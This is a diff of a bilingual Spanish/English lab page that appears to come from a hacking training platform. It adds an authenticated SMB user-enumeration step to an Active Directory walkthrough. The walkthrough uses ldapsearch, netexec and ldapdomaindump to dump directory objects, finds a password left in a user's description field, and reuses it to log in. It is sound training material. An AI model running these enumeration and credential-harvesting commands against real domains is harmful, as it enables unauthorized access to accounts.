@@ -6,7 +6,7 @@
 
   <div class="hl-card mb-4">
     <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
-    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_ldap_enum_obj_desc">Con la cuenta de servicio svc.readonly, vuelca los objetos del directorio por LDAP. El servidor permite binds simples sin cifrado y un administrador dejó escrita una contraseña —y la flag— en el atributo description de un usuario.</p>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_ldap_enum_obj_desc">Con la cuenta de servicio svc.readonly obtenida en AD 01, enumera los usuarios del dominio (la enumeración anónima no funciona contra este DC) y vuelca los objetos del directorio por LDAP. El servidor permite binds simples sin cifrado y un administrador dejó escrita una contraseña —y la flag— en el atributo description de un usuario.</p>
     <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>LDAP · atributo description</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
   </div>
 
@@ -14,10 +14,10 @@
 
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
-    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Contexto de nombres del directorio
-ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Enumerar usuarios del dominio con la credencial de AD 01
+nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users
 
-# Volcar descripciones de todos los usuarios
+# Volcar descripciones de todos los usuarios por LDAP
 nxc ldap {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' -M user-desc</pre>
   </div>
 </div>
@@ -31,7 +31,12 @@ nxc ldap {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' -M user-desc</pre>
 
 ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre>
 
-    <h3>2 · Bind autenticado con la cuenta de servicio</h3>
+    <h3>2 · Enumerar usuarios con la credencial de AD 01</h3>
+    <p>La enumeración anónima de usuarios (RID cycling con sesión nula o <code>guest</code>) no funciona contra este Domain Controller. Con la credencial <code>svc.readonly</code> obtenida en AD 01, SAMR sí responde con normalidad — es una sesión autenticada, no anónima.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users</pre>
+    <p>Devuelve los 15 usuarios del dominio junto con su descripción — incluida la de <code>t.rodriguez</code>, que usarás en el paso 4.</p>
+
+    <h3>3 · Bind autenticado con la cuenta de servicio</h3>
     <p>El servidor tiene <code>ldap server require strong auth = no</code>, así que acepta binds simples en texto claro.</p>
     <pre>export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
 export DC={{ ad_dc_ip }}
@@ -39,7 +44,7 @@ export DC={{ ad_dc_ip }}
 ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
   -b "$BASEDN" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
 
-    <h3>3 · Volcar usuarios, grupos y equipos</h3>
+    <h3>4 · Volcar usuarios, grupos y equipos</h3>
     <pre># Usuarios (sin cuentas de máquina)
 ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
   -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' \
@@ -56,7 +61,7 @@ nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' --groups
 # Y con windapsearch / ldapdomaindump
 ldapdomaindump -u '{{ ad_realm_lower }}\svc.readonly' -p 'ReadOnly123!' ldap://$DC -o loot/</pre>
 
-    <h3>4 · Buscar credenciales en los atributos</h3>
+    <h3>5 · Buscar credenciales en los atributos</h3>
     <p>El atributo <code>description</code> es legible por cualquier usuario autenticado y es donde más credenciales se filtran en dominios reales.</p>
     <pre># Módulo dedicado de netexec
 nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M user-desc
@@ -69,7 +74,7 @@ ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly1
     <pre>sAMAccountName: t.rodriguez
 description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}</pre>
 
-    <h3>5 · Capturar la flag</h3>
+    <h3>6 · Capturar la flag</h3>
     <pre>HL{···}</pre>
     <p>Además te llevas una credencial válida más: <code>t.rodriguez / Welcome2024!</code>.</p>
     <pre>nxc smb $DC -u 't.rodriguez' -p 'Welcome2024!'</pre>
@@ -93,7 +98,12 @@ description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024!
 
 ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre>
 
-    <h3>2 · Authenticated bind with the service account</h3>
+    <h3>2 · Enumerate users with the AD 01 credential</h3>
+    <p>Anonymous user enumeration (RID cycling with a null or <code>guest</code> session) does not work against this Domain Controller. With the <code>svc.readonly</code> credential from AD 01, SAMR responds normally — this is an authenticated session, not an anonymous one.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users</pre>
+    <p>Returns all 15 domain users along with their description — including <code>t.rodriguez</code>'s, which you'll use in step 5.</p>
+
+    <h3>3 · Authenticated bind with the service account</h3>
     <p>The server runs <code>ldap server require strong auth = no</code>, so it accepts cleartext simple binds.</p>
     <pre>export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
 export DC={{ ad_dc_ip }}
@@ -101,7 +111,7 @@ export DC={{ ad_dc_ip }}
 ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
   -b "$BASEDN" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
 
-    <h3>3 · Dump users, groups and computers</h3>
+    <h3>4 · Dump users, groups and computers</h3>
     <pre># Users (machine accounts excluded)
 ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
   -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' \
@@ -118,7 +128,7 @@ nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' --groups
 # And with ldapdomaindump
 ldapdomaindump -u '{{ ad_realm_lower }}\svc.readonly' -p 'ReadOnly123!' ldap://$DC -o loot/</pre>
 
-    <h3>4 · Hunt for credentials in the attributes</h3>
+    <h3>5 · Hunt for credentials in the attributes</h3>
     <p>The <code>description</code> attribute is readable by any authenticated user and is where most credentials leak in real domains.</p>
     <pre># Dedicated netexec module
 nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M user-desc
@@ -131,7 +141,7 @@ ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly1
     <pre>sAMAccountName: t.rodriguez
 description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}</pre>
 
-    <h3>5 · Capture the flag</h3>
+    <h3>6 · Capture the flag</h3>
     <pre>HL{···}</pre>
     <p>You also walk away with one more valid credential: <code>t.rodriguez / Welcome2024!</code>.</p>
     <pre>nxc smb $DC -u 't.rodriguez' -p 'Welcome2024!'</pre>
